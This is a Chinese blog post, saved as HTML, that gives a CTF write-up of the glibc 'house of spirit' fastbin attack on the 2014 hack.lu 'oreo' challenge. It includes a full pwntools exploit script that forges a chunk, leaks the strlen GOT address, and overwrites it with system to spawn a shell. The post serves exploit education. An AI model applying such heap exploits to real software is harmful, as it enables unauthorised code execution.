@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="如果你喜欢，就把这一切当作是荣耀，而不是炫耀--by 叶修" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>pwn-house of spirit | Invicsfate</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="fastbin-attack之house of spiritfastbin attack的攻击方式：  直接free某个地址，可以是bss,heap,stack等，但需要伪造已经分配堆内存时的内存布局即可，即house of spirit(与其相连的nextchunk-&amp;gt;size同样需要伪造)。 先malloc一个满足fastbin大小的chunk，free掉，修改掉其fd前向指针，指向我们">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-house of spirit">
+<meta property="og:url" content="http://Invicsfate.github.io/2018/10/09/pwn-house-of-spirit/index.html">
+<meta property="og:site_name" content="Invicsfate">
+<meta property="og:description" content="fastbin-attack之house of spiritfastbin attack的攻击方式：  直接free某个地址，可以是bss,heap,stack等，但需要伪造已经分配堆内存时的内存布局即可，即house of spirit(与其相连的nextchunk-&amp;gt;size同样需要伪造)。 先malloc一个满足fastbin大小的chunk，free掉，修改掉其fd前向指针，指向我们">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-10-09T14:48:25.711Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwn-house of spirit">
+<meta name="twitter:description" content="fastbin-attack之house of spiritfastbin attack的攻击方式：  直接free某个地址，可以是bss,heap,stack等，但需要伪造已经分配堆内存时的内存布局即可，即house of spirit(与其相连的nextchunk-&amp;gt;size同样需要伪造)。 先malloc一个满足fastbin大小的chunk，free掉，修改掉其fd前向指针，指向我们">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+</head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="Invicsfate" rel="home">Invicsfate</a>
+      </h1>
+      
+        <h2 class="site-description">
+          <a href="/" id="subtitle">bin选手一只，爱好二次元，最爱小姐姐(*^﹏^*)!</a>
+        </h2>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-pwn-house-of-spirit" class="post-pwn-house-of-spirit post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      pwn-house of spirit
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-house-of-spirit/" data-id="cjn2kj2r9000ry03komxdh8d8" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h2 id="fastbin-attack之house-of-spirit"><a href="#fastbin-attack之house-of-spirit" class="headerlink" title="fastbin-attack之house of spirit"></a>fastbin-attack之house of spirit</h2><p>fastbin attack的攻击方式：</p>
+<ol>
+<li>直接free某个地址，可以是bss,heap,stack等，但需要伪造已经分配堆内存时的内存布局即可，即house of spirit(与其相连的nextchunk-&gt;size同样需要伪造)。</li>
+<li>先malloc一个满足fastbin大小的chunk，free掉，修改掉其fd前向指针，指向我们想要分配的任意地址(同样需要伪造所在fastbin链中的chunk内存分布)，两次malloc之后，第二个chunk即指向任意地址。</li>
+</ol>
+<h3 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h3><p>利用思路：添加枪支的函数中存在heap overflow，申请的chunk大小属于fastbin范围，可以利用show_rifle函数泄露got表地址，也可以使用show_stats函数泄露got表地址，house of spirit技术对应free的地址为0x0804A2A8，从而可以写got表，最后getshell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./oreo'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">strlen_offset = libc.symbols[<span class="string">'strlen'</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_rifle</span><span class="params">(rifle_name,rifle_description)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	<span class="comment">#p.recvuntil("Rifle name: ")</span></span><br><span class="line">	p.sendline(rifle_name)</span><br><span class="line">	<span class="comment">#p.recvuntil("Rifle description: ")</span></span><br><span class="line">	p.sendline(rifle_description)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_rifle</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_rifle</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_message</span><span class="params">(message)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	<span class="comment">#p.recvuntil("Enter any notice you'd like to submit with your order: ")</span></span><br><span class="line">	p.sendline(message)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_stats</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"5"</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x40</span>):</span><br><span class="line">	add_rifle(str(i+<span class="number">1</span>),str(i+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">house_of_spirit = <span class="number">27</span> * <span class="string">'A'</span> + p32(<span class="number">0x0804A2A8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#p.recvuntil("Rifle name: ")</span></span><br><span class="line">p.sendline(house_of_spirit)</span><br><span class="line"><span class="comment">#p.recvuntil("Rifle description: ")</span></span><br><span class="line">p.sendline(<span class="number">25</span> * <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="number">28</span> * <span class="string">'B'</span> + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>)</span><br><span class="line">leave_message(message)</span><br><span class="line"></span><br><span class="line">free_rifle()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#p.recvuntil("Rifle name: ")</span></span><br><span class="line">p.sendline(str(<span class="number">0x1</span>))</span><br><span class="line"><span class="comment">#p.recvuntil("Rifle description: ")</span></span><br><span class="line">p.sendline(p32(<span class="number">0x0804A250</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak got of strlen</span></span><br><span class="line"><span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Order Message: "</span>)</span><br><span class="line">strlen_addr = u32(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="keyword">True</span>)[:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"strlen_addr:"</span>,hex(strlen_addr)</span><br><span class="line">libc_base_addr = strlen_addr - <span class="number">0x7E440</span></span><br><span class="line">system_addr = libc_base_addr + system_offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base_addr:"</span>,hex(libc_base_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line"></span><br><span class="line">message = p32(system_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">leave_message(message)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line"><span class="comment">#p.sendline("1")</span></span><br><span class="line"><span class="comment">#p.recvuntil("Rifle name: ")</span></span><br><span class="line"><span class="comment">#p.sendline('A')</span></span><br><span class="line"><span class="comment">#p.recvuntil("Rifle description: ")</span></span><br><span class="line"><span class="comment">#p.sendline("/bin/sh")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line"><span class="comment">#free_rifle()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>利用方法是直接house of spirit，写strlen的got表地址，直接泄露其地址，然后覆盖，最后调用strlen函数获得shell。<br>程序泄露的strlen函数地址指向了libc中偏移为0x7E440的一个函数，而不是libc.symbols[‘strlen’]获得的偏移，好诡异。<br>一开始打算使用free函数来获得shell，但是由于输入fgets的限制，如果覆盖free的got表，就会影响到fgets函数的最低位，从而无法申请新的chunk，所以选择覆盖strlen的got表。</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2018/10/09/pwn-house-of-spirit/">
+    <time datetime="2018-10-09T14:48:25.715Z" class="entry-date">
+        2018-10-09
+    </time>
+</a>
+    
+  <span class="article-delim">&#8226;</span>
+  <div class="article-category">
+  <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+    
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+        <span class="nav-previous"><a href="/2018/10/09/pwn-unlink/" rel="prev"><span class="meta-nav">←</span> pwn-unlink</a></span>
+    
+    
+        <span class="nav-next"><a href="/2018/10/09/pwn-extend/" rel="next">pwn-extend <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-content">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/GameSecurity/">GameSecurity</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/IOT/">IOT</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Tools/">Tools</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/others/">others</a><span class="category-list-count">9</span></li></ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2018/10/09/绕过某摄像头校验机制软刷固件/">绕过某摄像头校验机制软刷固件</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/09/pwn-unlink/">pwn-unlink</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/09/pwn-house-of-spirit/">pwn-house of spirit</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/09/pwn-extend/">pwn-extend</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/23/CS1-6-透视分析/">CS1.6-opengl简单透视分析</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-content">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PE/">PE</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/firmware/">firmware</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-content tagcloud">
+      <a href="/tags/PE/" style="font-size: 13.33px;">PE</a> <a href="/tags/firmware/" style="font-size: 13.33px;">firmware</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/reverse/" style="font-size: 20px;">reverse</a> <a href="/tags/web/" style="font-size: 10px;">web</a>
+    </div>
+  </aside>
+
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2018 Invicsfate
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
